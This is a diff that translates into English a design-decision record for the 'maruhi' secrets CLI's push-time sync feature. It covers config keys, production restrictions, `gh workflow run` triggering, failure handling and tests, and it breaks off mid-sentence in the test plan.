+SY2's final stage = **push-time sync (c) / `gh workflow run` / autoSync** (PR #157). The design's sources of truth are §3's head "final form of sync" table (the "who carries" row: only a human can change values → at the moment of change the writer's CLI is present → the writer's CLI syncs directly or triggers CI via `gh workflow run`), supplements 4 N1 / N2, 7 P1 / P2, and 14 M8; not re-litigated. The starting point is 2b's handoff (1): no slot reserved in the config format (unknown-key rejection + `version` allow adding — stage 2's ruling I). Direct sync vs CI triggering is ruled by supplement 7 P1's line (the leading shape doesn't give the writer a destination token). Each ruling point was decided by the same loop, and on "no new option" rounds we asked about failure modes (boundary values, environment differences, interruption debris, concurrent operations, double runs, failure direction, agent environments).
 
-**前提の確認(実物・実装で確かめた事実。日付はすべて 2026-09-08)**:
-(1) `maruhi push`(effect-cli.ts)は `openEnvironment` → stdin を `Redacted` に → `pushVariable`(1 変数 1 version。§4.1 の署名 =
-master 鍵)→ `Pushed …` → `proposeCheckpointRefresh` で、**同期設定を知らず `--config` も無い**。`PushedVersion` は
-`variableId` / `version` / `epoch` / `warnings` だけで検証済みビューを返さない(push はチェーンを進めないので `context.verified`
-のままでよく、後始末の `loadReceipt` が有界再同期を持つ)。push の床ハンドル(`context.floorHandle`)は push で前進している
-ので、同期元の床として**同じハンドル**を渡す(同じ環境に 2 つのハンドルを開かない — 第 2 段の改訂 1 の規律)。
-(2) `syncApplyOp`(sync-plan.ts)の plan は「レシートと現在の version の差」なので、レシートがあれば push 直後の apply が書くのは
-**今 push した変数だけ**(他は unchanged。前回の取りこぼしがあればそれも運ぶ)。レシートが無ければ全件 new = 初回同期。
-`requireProductionConsent` は `--yes` 無しの production を型付きエラーで止める。
-(3) `gh` 2.100.0(cli/cli `pkg/cmd/workflow/run/run.go` / `internal/ghcmd/cmd.go` を取得): `gh workflow run <file> -f key=value`
-(`-f` = raw string、`-F` = `@` 構文つき)。**`--ref` 省略時は `api.RepoDefaultBranch` = リポジトリの既定ブランチ**(現在の
-ブランチではない)。workflow の指定が無く対話できないときは「workflow ID, name, or filename required when not running
-interactively」で失敗。成功時の「Created workflow_dispatch event …」は **stdout が TTY のときだけ**出力され、API は 204 を返すので
-**run の URL は出ない**。終了コード: 0 / 1 = error / 2 = cancel / **4 = auth**(`exitAuth`)/ 8 = pending。テレメトリ:
-`GH_TELEMETRY=false|0`、`DO_NOT_TRACK=1`(SY1 の実測表の gh 行。同行は `GH_NO_UPDATE_NOTIFIER` にも触れる)。
-(4) `ProcessRunner.exec`(run.ts / live.ts)は `ExecInput`(argv / cwd / `extraEnv` / `stdin: Redacted`)→ `ExecOutcome`(終了コードと
-切らない出力)で、`gh workflow run` は「値の無い子プロセス」としてそのまま載る(stdin は空の `Redacted.make` — 剥がす場所は増えない)。
-起動失敗の文面は live.ts の `execStartFailure`(「named by the target's command in the sync config」→ 「a `command` in the sync
-config」に一般化。`workflow.command` も指す)。
-(5) 2b の後始末の規律(sync-rotate.ts の `asCleanupOutcome`: 通信・権限・競合は警告で終了コード不変、`CliError.evidence` だけ
-失敗)は sync-rotate.ts の非公開関数だった → errors.ts へ移して sync-push.ts と共用(重複を作らない)。
-(6) `sync-config.ts` の未知キー拒否により、`onPush` / `workflow` を足しても `version: 1` のまま(省略可 = 手動のみ)。古い CLI は
-新キーを「unknown keys」で拒む(第 2 段の裁定 H で受容済み)。`SyncTarget.production` は解析時に確定している(プリセットの判定 +
-明示上書き)ので、「production に `"apply"`」は**設定の段階で**拒める。
-(7) テストの土台: `makeValueEnvironmentServer`(value-env.ts)は create / new version の push を受理して pull に反映するので、
-「push → 後始末の apply → レシート」が支援モジュール無変更で通る。cwd の既定パスの態は vitest 4 の既定 pool(forks)で
-`process.chdir` が使える(`afterEach` で戻す)。偽 `ProcessRunner` は起動失敗(`CliError`)を返せなかった → `setExecHandler` が
-`ExecOutcome | CliError` を返せるように(env.ts の 1 点)。
+**Premise verification (facts confirmed against the real things / the implementation. All dates 2026-09-08)**:
+(1) `maruhi push` (effect-cli.ts) is `openEnvironment` → stdin to `Redacted` → `pushVariable` (1 variable = 1 version. §4.1 signature = master key) → `Pushed …` → `proposeCheckpointRefresh`, and **doesn't know the sync config and has no `--config`**. `PushedVersion` carries only `variableId` / `version` / `epoch` / `warnings` and doesn't return a verified view (push doesn't advance the chain, so `context.verified` suffices; cleanup's `loadReceipt` has a bounded re-sync). push's floor handle (`context.floorHandle`) is already advanced by the push, so the **same handle** is passed as the sync-source floor (never open two handles on one environment — stage 2 revision 1's discipline).
+(2) `syncApplyOp` (sync-plan.ts)'s plan is "the diff between the receipt and current versions", so with a receipt, a post-push apply writes **only the just-pushed variables** (the rest are unchanged; a prior miss is carried too). With no receipt it's all-new = first sync. `requireProductionConsent` stops production without `--yes` via a typed error.
+(3) `gh` 2.100.0 (fetched cli/cli's `pkg/cmd/workflow/run/run.go` / `internal/ghcmd/cmd.go`): `gh workflow run <file> -f key=value` (`-f` = raw string, `-F` = `@` syntax). **Omitting `--ref` gives `api.RepoDefaultBranch` = the repo's default branch** (not the current branch). With no workflow specified and no interactivity: fails with "workflow ID, name, or filename required when not running interactively". On success, "Created workflow_dispatch event …" prints **only when stdout is a TTY**, and the API returns 204 so **no run URL is produced**. Exit codes: 0 / 1 = error / 2 = cancel / **4 = auth** (`exitAuth`) / 8 = pending. Telemetry: `GH_TELEMETRY=false|0`, `DO_NOT_TRACK=1` (the gh row of SY1's measurement table. That row also touches `GH_NO_UPDATE_NOTIFIER`).
+(4) `ProcessRunner.exec` (run.ts / live.ts) is `ExecInput` (argv / cwd / `extraEnv` / `stdin: Redacted`) → `ExecOutcome` (exit code + uncut output), and `gh workflow run` rides it as "a child process with no value" (stdin is an empty `Redacted.make` — no new unwrap site). The start-failure wording is live.ts's `execStartFailure` ("named by the target's command in the sync config" → generalized to "a `command` in the sync config". Also covers `workflow.command`).
+(5) 2b's cleanup discipline (sync-rotate.ts's `asCleanupOutcome`: communication / permission / contention = warning with exit code unchanged, only `CliError.evidence` fails) was a private function of sync-rotate.ts → moved to errors.ts and shared with sync-push.ts (no duplication).
+(6) Thanks to sync-config.ts's unknown-key rejection, adding `onPush` / `workflow` keeps `version: 1` (omittable = manual only). Old CLIs reject the new keys as "unknown keys" (already accepted in stage 2's ruling H). Since `SyncTarget.production` is settled at parse time (preset determination + explicit override), `"apply"` to production can be refused **at the config stage**.
+(7) Test basis: `makeValueEnvironmentServer` (value-env.ts) accepts create / new-version pushes and reflects them in pulls, so "push → cleanup apply → receipt" passes with no support-module change. The cwd default-path cases can use `process.chdir` under vitest 4's default pool (forks) (restored in `afterEach`). The fake `ProcessRunner` couldn't return a start failure (`CliError`) → `setExecHandler` now returns `ExecOutcome | CliError` (one point in env.ts).
 
-**起動の形 × ターゲットの状態 × 設定の所在 × 失敗(裁定 A〜G の入力)**:
+**Trigger shape × target state × config location × failure (input to rulings A–G)**:
 
-| push 先 / 変数 | ターゲット | `onPush` | 設定の所在 | 結果 |
+| Push target / variable | Target | `onPush` | Config location | Result |
 |---|---|---|---|---|
-| 同期元・運ぶ変数 | preview / 名前付き環境(非 production)、exec / http | `"apply"` | 明示 / 既定(project 一致) | `Pushed` → 提案 → `Syncing target …` → plan(unchanged は省く)→ ドライバ → レシート |
-| 同期元・運ぶ変数 | production | `"apply"` | — | **設定の誤り**(1)。push は送られない(設定はネットワークより先に読む) |
-| 同期元・運ぶ変数 | production / それ以外 | `"workflow"` | 明示 / 既定 | `Pushed` → 提案 → `gh workflow run <file> -f target=<name> [--ref]` → `Triggered …`(受理のみ)。レシート環境へのリクエスト 0 |
-| 同期元・運ばない変数(明示リスト外 / exclude / トークン) | 任意 | 任意 | 任意 | 何もしない(明示 `--config` なら note) |
-| 同期元でない環境 / レシート環境(設定上ありえない) | — | — | — | 同上 |
-| 任意 | 任意 | 無し | 任意 | 何もしない(静か。production の案内も出さない — 毎回の push に無関係な note を出さない) |
-| 任意 | — | — | `--no-sync` | 設定を読まない(push だけ) |
-| 任意 | — | — | 既定パスに無い | 従来の push |
-| 任意 | — | — | 既定パスが壊れている | **1**・push は送られない(黙って飛ばさない) |
-| 任意 | — | — | 明示 `--config` の `project` 不一致 | **2**・push は送られない(2b の裁定 B) |
-| 任意 | — | — | 既定パスの `project` 不一致 | push はそのまま・note・何もしない |
-| 失敗: ベンダー CLI / gh の非 0・起動失敗・運べない値・通信 | — | — | — | 警告・終了コード 0(`Pushed` は出ている)・レシートは進まない = 次の plan が pending |
-| 失敗: gh の終了コード 4 | — | `"workflow"` | — | 「gh is not signed in(`gh auth login`)」を名指し・0 |
-| 失敗: 証拠(レシート環境の床違反・署名の不成立) | — | — | — | **1**(`Pushed` は出ている。警告に畳まない) |
+| sync source, carried variable | preview / named environment (non-production), exec / http | `"apply"` | explicit / default (project matches) | `Pushed` → proposal → `Syncing target …` → plan (unchanged omitted) → driver → receipt |
+| sync source, carried variable | production | `"apply"` | — | **config error** (1). The push is never sent (config is read before the network) |
+| sync source, carried variable | production / other | `"workflow"` | explicit / default | `Pushed` → proposal → `gh workflow run <file> -f target=<name> [--ref]` → `Triggered …` (acceptance only). Zero requests to the receipt environment |
+| sync source, non-carried variable (off the explicit list / excluded / the token) | any | any | any | nothing (a note only with explicit `--config`) |
+| a non-sync-source environment / the receipt environment (impossible by config) | — | — | — | same |
+| any | any | absent | any | nothing (quiet. Doesn't even show the production guidance — don't emit an unrelated note on every push) |
+| any | — | — | `--no-sync` | the config isn't read (push only) |
+| any | — | — | not at the default path | a push as before |
+| any | — | — | default path is broken | **1**, the push is never sent (don't silently skip) |
+| any | — | — | explicit `--config`'s `project` mismatch | **2**, the push is never sent (2b ruling B) |
+| any | — | — | default path's `project` mismatch | the push proceeds, a note, nothing else |
+| failure: vendor CLI / gh nonzero, start failure, uncarriable value, communication | — | — | — | warning, exit code 0 (`Pushed` already printed), the receipt doesn't advance = the next plan shows pending |
+| failure: gh exit code 4 | — | `"workflow"` | — | names "gh is not signed in (`gh auth login`)". 0 |
+| failure: evidence (floor violation on the receipt environment, signature failure) | — | — | — | **1** (`Pushed` already printed. Not folded into a warning) |
 
-**A. 起動の形と SY3 との境界** — 列挙: (i) 書き手の CLI が直接 apply だけ(補足 4 N1)/ (ii) 書き手の `gh` で CI 起動だけ(補足 7
-P1)/ (iii) **設定でターゲットごとに選ぶ**(`"apply"` = 直接 / `"workflow"` = CI 起動)/ (iv) 両方(直接 apply に失敗したら CI
-起動)。第 1 周の新案: (v) workflow の**最小の例**を docs に置く形(あり — しかし SY3 との境界を問う: テンプレート本体
-〔permissions / OIDC / checkout / 導入 / Environments〕は SY3 の成果物で、本段が置いてよいのは「起動先が満たすべき**契約**」
-= `workflow_dispatch` + `target` 入力 + `maruhi ci sync ${{ inputs.target }} --yes` の 1 行まで。契約なしには `-f target=` の意味が
-定まらないので契約は本段の面、テンプレートは SY3 のまま = 段の入れ替えは起こさない)。第 2 周(壊れ方): (iv) は「直接 apply の
-失敗 → CI 起動」で平文の行き先(書き手の機械か CI か)が実行ごとに変わり、P1 の「書き手にトークンを持たせない」を黙って崩す
-(逆方向も同じ)。(i) / (ii) はどちらか一方の運用(小チームは直接、資格を絞るチームは CI)を切り捨てる。二重起動: 同じ push で
-同じターゲットは 1 回(設定の順に 1 回ずつ)。同じ workflow ファイルを 2 ターゲットが指せば 2 run(ターゲットごとに 1 run —
-docs に明記)(なし)。**選定 = (iii) + (v) の契約だけ**。棄却: (i) / (ii)(片方の運用を切る)、(iv)(行き先が実行ごとに変わる)、
-テンプレートの取り込み(段の入れ替え = 所有者確認事項。取り込まない)。
+**A. The trigger shape and the boundary with SY3** — enumeration: (i) the writer's CLI applies directly only (supplement 4 N1) / (ii) the writer's `gh` triggers CI only (supplement 7 P1) / (iii) **choose per target in config** (`"apply"` = direct / `"workflow"` = CI trigger) / (iv) both (trigger CI when direct apply fails). Round-1 new option: (v) a form that places a **minimal workflow example** in docs (available — but it forces the boundary question with SY3: the template body〔permissions / OIDC / checkout / install / Environments〕is SY3's deliverable, and what this stage may place is "the **contract** the triggered workflow must satisfy" = up to `workflow_dispatch` + a `target` input + the one line `maruhi ci sync ${{ inputs.target }} --yes`. Without the contract `-f target=`'s meaning isn't defined, so the contract belongs to this stage and the template stays SY3's = no stage swap happens). Round 2 (failure modes): (iv) makes "direct apply fails → trigger CI" change plaintext's destination (the writer's machine vs CI) per run, silently breaking P1's "don't give the writer the token" (the reverse direction is the same). (i) / (ii) each abandons one mode of operation (small teams direct, credential-constrained teams CI). Double triggers: the same target on the same push fires once (once each in config order). If 2 targets name the same workflow file, that's 2 runs (1 run per target — stated in docs) (no). **Chosen = (iii) + only (v)'s contract**. Rejected: (i) / (ii) (abandoning one mode), (iv) (destination changes per run), absorbing the template (a stage swap = an owner-confirmation matter. Not absorbed).
 
-**B. 設定の表現と探索** — 表現の列挙: (i) `autoSync: true|false` / (ii) **`onPush: "apply" | "workflow"` + `workflow: { file, ref?,
-command? }`** / (iii) ルートに `onPush` の節を置きターゲット名を列挙 / (iv) 同期元の環境単位。探索の列挙: (a) `push --config` 明示のみ
-(2b の裁定 B)/ (b) **cwd の既定パス `maruhi.sync.json`(+ 明示 `--config`)** / (c) `maruhi config set` で場所を覚える / (d) git
-ルートまで遡る。第 1 周の新案: **`onPush` を持つ設定に top-level `project` を要求する**(あり — 既定パスを黙って読む形の危険
-〔2b の裁定 B: 別プロジェクトのリポジトリで打つと `project` を省いた設定を黙って使う〕を、「名乗った設定にしか使わない」で
-構造的に消す。`sync init` の `project` の案内とも噛み合う。実行時の note でなく**解析時の拒否**にすれば、`onPush` を書いた瞬間に
-`sync plan` でも分かる)。第 2 周(壊れ方): (a) は「同期を忘れる」を「`--config` を忘れる」に置き換えるだけで第 3 段の問題を解かない。
-(c) は機械ごとの設定がリポジトリの設定を指す形で、機械間で漂う。(d) は monorepo の下位ディレクトリから打つ形を救うが、`sync plan`
-も cwd の既定パスしか見ないので揃わない(需要が出たら両方同時に)。(i) は「どちらの形か」を言えない。(iii) / (iv) は環境 →
-ターゲットの写像を二重に持つ。(b) で既定パスが**壊れている**ときは黙って飛ばさず 1 で止める(push の前 — 設定はネットワーク
-より先に読む)。既定パスの `project` 不一致は「この設定はこの push の話ではない」なので push はそのまま行い note(明示なら 2 —
-利用者の断言)。`onPush` を 1 つも持たない設定は push に無関係なので `project` を見ない(手動同期だけの設定に note を出さない)。運ばない変数(明示リスト外・exclude・構造で除かれる統合トークン)の push は何もしない(トークンを push した直後に
-「Nothing to apply」を出さない)。`workflow.file` / `ref` は `-` 始まりを拒む(gh のフラグと読まれる形を設定で作らせない)(なし)。
-**選定 = (ii) + (b)**。キー名は `autoSync` でなく `onPush`(「push の直後」に限る事実を名前が言う。rotate / var rm では起きない)。
-`"off"` の値は持たない(省略 = 手動のみ。継承が無いので明示 off に意味が無い)。棄却: (i) / (iii) / (iv)、(a) / (c) / (d)。
+**B. Config expression and discovery** — expression enumeration: (i) `autoSync: true|false` / (ii) **`onPush: "apply" | "workflow"` + `workflow: { file, ref?, command? }`** / (iii) an `onPush` section at the root enumerating target names / (iv) per sync-source environment. Discovery enumeration: (a) explicit `push --config` only (2b's ruling B) / (b) **cwd's default path `maruhi.sync.json` (+ explicit `--config`)** / (c) `maruhi config set` remembers the location / (d) ascend to the git root. Round-1 new option: **require top-level `project` on configs that carry `onPush`** (available — the danger of silently reading a default path〔2b's ruling B: run in another project's repo, a `project`-less config is silently used〕is structurally eliminated by "only used when the config names itself". Dovetails with `sync init`'s `project` guidance. Making it a **parse-time rejection** rather than a run-time note means even `sync plan` surfaces it the moment `onPush` is written). Round 2 (failure modes): (a) merely replaces "forgetting to sync" with "forgetting `--config`", not solving stage 3's problem. (c) is a per-machine config pointing at the repo's config — drifts between machines. (d) saves running from a monorepo subdirectory, but `sync plan` also only looks at cwd's default path, so they wouldn't match (when demand appears, do both at once). (i) can't say "which shape". (iii) / (iv) duplicate the environment → target mapping. Under (b), a **broken** default path stops with 1 rather than silently skipping (before the push — config is read before the network). A `project` mismatch at the default path means "this config isn't about this push", so the push proceeds with a note (explicit = 2 — the user's assertion). A config with no `onPush` at all is unrelated to push, so `project` isn't checked (don't note on a manual-sync-only config). Pushing a non-carried variable (off the explicit list, excluded, the structurally-excluded integration token) does nothing (no "Nothing to apply" right after pushing the token). `workflow.file` / `ref` refuse leading `-` (don't let config build a shape gh reads as a flag) (no). **Chosen = (ii) + (b)**. The key name is `onPush`, not `autoSync` (the name states the fact that it's limited to "right after push". It doesn't fire on rotate / var rm). No `"off"` value (omitted = manual only; with no inheritance, an explicit off is meaningless). Rejected: (i) / (iii) / (iv), (a) / (c) / (d).
 
-**C. production の既定と `--yes`** — 列挙: (i) production は autoSync の対象外(直接も CI 起動もしない)/ (ii) **直接 apply は不可・
-CI 起動は可** / (iii) `push --yes` で production も直接 apply。第 1 周の新案: production への `"apply"` を**設定の段階で拒む**(あり —
-実行時の note より早く、`sync plan` でも分かる。文面が `"workflow"` への道と `production: false` の上書きを言う)。第 2 周(壊れ方):
-(iii) は第 1 段の裁定 J(plan を先に出し、明示フラグで apply)を崩す — `push --yes` は plan を見る前の同意で、しかも push そのものへの
-同意と混ざる。(i) は補足 7 の標準形 ②(Vercel = 書き手からの CI 起動)を production で使えなくし、四眼(GitHub Environments の
-required reviewers — 補足 15 X4)の置き場を失う。(ii) の CI 起動は値を書く行為ではなく、値を書く決定は workflow ファイルの `--yes`
-(リポジトリでレビュー済み。docs「In CI」の 4 点目)にある(なし)。**選定 = (ii)**。棄却: (i)(標準形 ② を production で失う)、
-(iii)(裁定 J に反する)。
+**C. The production default and `--yes`** — enumeration: (i) production is outside autoSync (neither direct nor CI trigger) / (ii) **direct apply not allowed; CI trigger allowed** / (iii) `push --yes` applies production directly. Round-1 new option: refuse `"apply"` to production **at the config stage** (available — earlier than a run-time note, and `sync plan` surfaces it too. The wording names the `"workflow"` path and the `production: false` override). Round 2 (failure modes): (iii) breaks stage 1's ruling J (emit a plan first, apply via explicit flag) — `push --yes` is consent given before seeing the plan, and gets mixed with consent to the push itself. (i) makes supplement 7's standard form ② (Vercel = CI trigger from the writer) unusable for production and loses the home of four-eyes (GitHub Environments' required reviewers — supplement 15 X4). (ii)'s CI trigger isn't the act of writing a value; the decision to write lives in the workflow file's `--yes` (reviewed in the repo. Docs "In CI" point 4) (no). **Chosen = (ii)**. Rejected: (i) (losing standard form ② for production), (iii) (against ruling J).
 
-**D. push との結合と後始末の規律** — 列挙: (i) `push` のハンドラの末尾に後始末を足す(2b の `envRotateCommand` と同じ形)/ (ii)
-`pushVariable` の内側に入れる / (iii) **新モジュール `sync-push.ts` に後始末を置き、`push` のハンドラが呼ぶ**。第 1 周の新案:
-`asCleanupOutcome` を errors.ts へ移して 2b と共用(あり — sync-push が sync-rotate を import する向きを作らない)。第 2 周
-(壊れ方): (ii) は push.ts が sync-* を知る(2b の裁定 A (iv) と同じ棄却理由)。読む順序: 設定はネットワークより先(壊れた設定・
-明示の不一致を push の後ろに置かない)、後始末の内容(`decidePushSync`)は `openEnvironment` の後・`pushVariable` の**前**に決める
-(明示の `project` 不一致 = 2 で push は送られない)。出力順: `Pushed` → checkpoint / アンカーの提案 → 後始末(2b の改訂 4 と同じ
-理由 — 後始末が証拠で失敗しても提案は出ている)。複数ターゲット: 設定の順にすべて、1 つの失敗で残りを止めない。床: 同期元 =
-push 先なので `context.floorHandle` を共有、レシート環境は `floorHandleFor`(設定が「同期元 ≠ レシート環境」を保証)、統合トークン
-の環境は `openSyncTarget` と同じ規則(同期元 / レシート環境と同じならそのハンドル)。`yes: false` 固定(production は設定で
-拒まれている。万一到達すれば `requireProductionConsent` が止め警告になる)。plan の描画は unchanged の行だけ省く(`display`
-— 30 変数のターゲットで毎回 30 行の `=` を出さない。ヘッダーの件数と `Running … in …` の行はそのまま = 平文の行き先は見える)
-(なし)。**選定 = (iii)** + 2b の裁定 D の継承。棄却: (i)(ハンドラが肥大)、(ii)(push.ts が sync を知る)。
+**D. Coupling with push and the cleanup discipline** — enumeration: (i) append cleanup to the end of `push`'s handler (same shape as 2b's `envRotateCommand`) / (ii) put it inside `pushVariable` / (iii) **place cleanup in a new module `sync-push.ts`, called by `push`'s handler**. Round-1 new option: move `asCleanupOutcome` to errors.ts to share with 2b (available — doesn't create a direction where sync-push imports sync-rotate). Round 2 (failure modes): (ii) makes push.ts know sync-* (the same rejection reason as 2b's ruling A (iv)). Read order: config before the network (don't put broken config / explicit mismatch behind the push); cleanup's content (`decidePushSync`) is decided after `openEnvironment`, **before** `pushVariable` (an explicit `project` mismatch = 2 and the push isn't sent). Output order: `Pushed` → checkpoint / anchor proposal → cleanup (same as 2b's revision 4
+reason — the proposal prints even if cleanup fails on evidence). Multiple targets: all in config order; one failure doesn't stop the rest. Floors: the sync source = the push destination, so `context.floorHandle` is shared; the receipt environment uses `floorHandleFor` (the config guarantees "sync source ≠ receipt environment"); the integration token's environment follows the same rule as `openSyncTarget` (if equal to the sync source / receipt environment, use that handle). `yes: false` fixed (production is refused at the config level; if it ever arrives, `requireProductionConsent` stops it as a warning). plan's drawing omits only unchanged lines (`display` — don't print 30 lines of `=` every time for a 30-variable target. The header counts and the `Running … in …` line stay = plaintext's destination stays visible) (no). **Chosen = (iii)** + inheriting 2b's ruling D. Rejected: (i) (the handler bloats), (ii) (push.ts would know sync).
 
-**E. 複数 push と M8** — 列挙: (i) push ごとに同期 / (ii) **`--no-sync` で抑止し末尾に明示 `sync apply`**(M8 の第 1 案)/ (iii)
-debounce(短い待ち・ディスク上の印)/ (iv) 一括 push コマンド。第 1 周の新案: なし。第 2 周(壊れ方): (iii) は「同期待ち」の印を
-ディスクに置くか、残るプロセスを要る。名前も値も持たない印(「pending」のみ)ならディスクレスに反しないが、機構(印の置き場・
-掃除・並行 push との競合)を 1 つ増やす。Vercel の exec は 1 変数 1 プロセスなので push ごとの同期でもベンダー呼び出しは push
-回数分 = 変数の数と同じ(まとめても減らない)。http は配列 upsert で push ごと 1 リクエスト。`--no-sync` は既定パスの設定を**読まない**
-(明示の `--config` との併用は書き方の誤り = 2 — 指した設定を読まずに済ませる形を黙って通さない。改訂 1)。(iv) は本段の外(なし)。**選定 = (i) + (ii)**。棄却: (iii)(機構の
-追加。需要が出たら再裁定)、(iv)(スコープ外)。
+**E. Multiple pushes and M8** — enumeration: (i) sync per push / (ii) **suppress with `--no-sync` and an explicit `sync apply` at the end** (M8's first option) / (iii) debounce (a short wait + an on-disk marker) / (iv) a bulk push command. Round-1 new option: none. Round 2 (failure modes): (iii) requires either a "sync pending" marker on disk or a surviving process. A marker holding neither name nor value (just "pending") doesn't violate diskless, but adds a mechanism (marker location, cleanup, contention with concurrent pushes). Since Vercel's exec is one process per variable, vendor calls under per-push sync = number of pushes = same as the number of variables (batching doesn't reduce it). http is an array upsert = 1 request per push. `--no-sync` doesn't **read** the default-path config (combining it with explicit `--config` is a usage error = 2 — don't silently let it pass as "pointed at a config but didn't read it". Revision 1). (iv) is outside this stage (no). **Chosen = (i) + (ii)**. Rejected: (iii) (adds a mechanism. Re-rule if demand appears), (iv) (out of scope).
 
-**F. `gh workflow run` の形** — argv: `[command, "workflow", "run", file, "-f", "target=<name>", ("--ref", ref)?]`。`-f`(raw string)を
-使う(`-F` の `@` 構文は要らない)。cwd = **設定ファイルの場所**(exec ドライバと同じ規律。gh はそこの git remote からリポジトリを
-解決する。ターゲットの `cwd` は exec ドライバの面なので使わない)。`ProcessRunner.exec` を流用(stdin 空・`extraEnv` =
-`GH_TELEMETRY=false` / `DO_NOT_TRACK=1` / `GH_NO_UPDATE_NOTIFIER=1`〔SY1 の表の gh 行〕+ `GH_PROMPT_DISABLED=1`〔stdout を捕捉するので
-gh は既に非対話だが、対話を構造で切る〕)。第 1 周の新案: `--ref` の既定は gh に任せる(あり — 既定ブランチ。workflow ファイルと
-CI が読む設定はそこにあり、書き手のブランチが push 済みかに依らない。値は maruhi に既にあるので CI がどのブランチで走っても新鮮)。
-第 2 周(壊れ方): git remote が無い / workflow が無い / `workflow_dispatch` が無い = gh の非 0 + gh 自身の文面(伏せてから末尾を
-`  gh: …` で見せる)+ 「exists on the branch gh dispatches to / has a workflow_dispatch trigger with a "target" input」の案内。終了
-コード 4 = 未ログインを名指し(`gh auth login`)。gh 不在 = live.ts の起動失敗の文面(警告に畳む)。受理の報告は「Triggered
-workflow X for target Y (`gh workflow run` in <dir>)」+ 「CI applies it with `maruhi ci sync` and keeps no receipt, so the next local
-`maruhi sync plan Y` still shows the pushed variable as pending」(裁定 G)。run の URL は gh が出さない(前提 (3))ので添えない(なし)。
-`workflow.command` で gh の実行体を上書きできる(exec の `command` と同じ理由 — PATH に無い導入)。
+**F. The `gh workflow run` shape** — argv: `[command, "workflow", "run", file, "-f", "target=<name>", ("--ref", ref)?]`. Uses `-f` (raw string) (`-F`'s `@` syntax isn't needed). cwd = **the config file's location** (the same discipline as the exec driver. gh resolves the repo from that dir's git remote. The target's `cwd` is the exec driver's concern — unused). Reuses `ProcessRunner.exec` (stdin empty, `extraEnv` = `GH_TELEMETRY=false` / `DO_NOT_TRACK=1` / `GH_NO_UPDATE_NOTIFIER=1`〔the gh row of SY1's table〕+ `GH_PROMPT_DISABLED=1`〔gh is already non-interactive since stdout is captured, but this structurally cuts interactivity〕). Round-1 new option: `--ref`'s default is left to gh (available — the default branch. The workflow file and the config CI reads live there, regardless of whether the writer's branch is pushed. Values are already in maruhi, so they're fresh no matter which branch CI runs on). Round 2 (failure modes): no git remote / no workflow / no `workflow_dispatch` = gh nonzero + gh's own wording (shown as `  gh: …` tail after redaction) + the guidance "exists on the branch gh dispatches to / has a workflow_dispatch trigger with a "target" input". Exit code 4 = not logged in, named (`gh auth login`). gh absent = live.ts's start-failure wording (folded into a warning). The acceptance report is "Triggered workflow X for target Y (`gh workflow run` in <dir>)" + "CI applies it with `maruhi ci sync` and keeps no receipt, so the next local `maruhi sync plan Y` still shows the pushed variable as pending" (ruling G). The run URL isn't appended since gh doesn't produce it (premise (3)) (no). `workflow.command` can override gh's executable (the same reason as exec's `command` — an install not on PATH).
 
-**G. 未同期の印と回収** — 新しい機構は作らない: レシートの遅れ = 印(`sync plan` が pending)。直接 apply の失敗・CI 起動の失敗の
-文面は「The next `maruhi sync plan <target>` shows the pushed variable as pending; `maruhi sync apply <target>` or CI delivers it」で
-2b と揃える。CI 起動の成功は「運ばれた」ことを意味しない(レシートは CI が書けない)ので、報告の文面で「手元のレシートは進まない
-= 次の手元の plan は pending のまま・apply は 1 回書き直す」と言う(docs「In CI」の 3 点目・「Receipts」の 2 点目に追記)。
-第 1 周の新案: なし。第 2 周: なし。
+**G. The unsynced marker and its collection** — no new mechanism is built: the lagging receipt IS the marker (`sync plan` shows pending). The failure wording for direct apply / CI trigger is "The next `maruhi sync plan <target>` shows the pushed variable as pending; `maruhi sync apply <target>` or CI delivers it", matching 2b. A successful CI trigger doesn't mean "delivered" (CI can't write receipts), so the report's wording says "the local receipt doesn't advance = the next local plan stays pending; apply rewrites once" (appended to docs "In CI" point 3 and "Receipts" point 2). Round-1 new option: none. Round 2: none.
 
-**H. エージェント環境** — 新しいゲートは作らない(補足 9 — `sync` は `run` と同じ扱い)。「エージェントの push が自動で同期先へ
-届く」形について: `onPush` は**リポジトリの設定で人が決めた opt-in** で、エージェントは設定を変えない限り新しい経路を得ない
-(設定の変更はコードレビューの対象 — docs「How maruhi sync works」の 1 点目)。届く先は非 production だけ(production の直接 apply
-は設定で拒む)で、production は CI の workflow(レビュー済みの `--yes` + 必要なら required reviewers)を経る。エージェントが値を
-持ち出す経路としては `maruhi run -- curl` が既にあり(補足 9 の決定的な事実)、push 時同期は新しい持ち出し経路ではない。よって
-「設定が opt-in である = 人が決めた」で足りる。
+**H. Agent environments** — no new gate is built (supplement 9 — `sync` is treated the same as `run`). On the shape "an agent's push automatically reaches the destination": `onPush` is **an opt-in a human decided in the repo's config**, and an agent gains no new route unless the config is changed (a config change is subject to code review — docs "How maruhi sync works" point 1). Reachable destinations are non-production only (production direct apply is refused at the config level); production goes through a CI workflow (a reviewed `--yes` + required reviewers if needed). As a route for an agent carrying values out, `maruhi run -- curl` already exists (supplement 9's decisive fact), and push-time sync isn't a new exfiltration route. So "config is opt-in = decided by a human" suffices.
 
-**I. テスト** — `test/sync-push.test.ts`(新規。`sync-command.test.ts` の土台 = `makeValueEnvironmentServer` + 偽 `ProcessRunner`)
-の 19 態: push → 直接 apply → レシートが進む(順序・unchanged の行が無い・ベンダー 1 回・stdin = 新しい値・argv に値なし)/ cwd の
-既定パス(`process.chdir`)/ `--no-sync`(ベンダー 0・レシート環境へのリクエスト 0)/ 設定が無い / 明示の `project` 不一致 = 2・push
-未送信 / 既定パスの `project` 不一致 = 0・note / 壊れた既定パス = 1・push 未送信 / 同期元でない環境・運ばない変数・onPush 無し =
-何もしない(明示なら note) / production + `"apply"` = 設定の誤り / ベンダーの失敗 = 警告・0・レシート据え置き・次の plan が
-pending / 起動失敗 = 警告・0 / 運べない値(末尾改行)= 警告・送信 0 / 証拠(value-version rollback)= 1・`Pushed` は出ている /
-`gh workflow run` の argv・cwd・env・stdin 空・値も変数名も無い・レシート環境へのリクエスト 0 / `--ref` 無し + `command` 上書き /
-gh の 4 = 未ログイン / gh の非 0 = 出力の末尾 + 案内(制御文字は中和)/ gh 不在 / 複数ターゲット(apply + workflow)で 1 つの失敗が
-残りを止めない。`sync-units.test.ts` に `onPush` の解析(受理 4 形・拒否 10 形・`project` 要求)、`sync-init.test.ts` に `--on-push`
-の往復(+ `project` 無し = 2・production + apply = 2)。`--help` golden(`push` に `--config` / `--no-sync`、`sync init` に `--on-push` /
